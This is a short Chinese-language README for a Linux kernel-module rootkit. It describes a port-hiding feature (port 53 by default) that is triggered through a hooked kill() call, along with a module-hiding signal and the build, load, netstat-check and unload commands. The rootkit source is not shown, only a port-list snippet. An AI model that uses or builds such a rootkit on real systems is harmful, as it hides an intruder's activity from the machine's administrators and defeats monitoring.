#端口隐藏
在不高于4.6的内核上测试功能没问题，可以隐藏任意tcp端口，
在代码中
``` 
// 需要隐藏的端口列表
int port_list[MAX_PORT] = {53};
// 隐藏端口列表长度
int port_num = 1;
```
部分设置。

代码修改
---
在模板基础上添加了端口隐藏功能，主要实现函数在hacked_kill()中被调用，
设置kill -2 0执行端口隐藏功能，kill -3 0时执行模块隐藏，数字顺序后续可在.h文件中修改，

编译
----
```
sudo make
```

首先查看所有和本地计算机建立连接的IP和端口，上传的程序设置的是隐藏53端口

```
netstat -an | head -4
```

导入RootKit.ko

```
sudo insmod RootKit.ko
```
使用了模板中的命令行，定义

```
kill -2 0
```
时执行端口隐藏操作，
再次查看连接和端口，53端口已经被隐藏
```
netstat -an | head -4
```

卸载lkm
----
```
sudo rmmod RootKit
```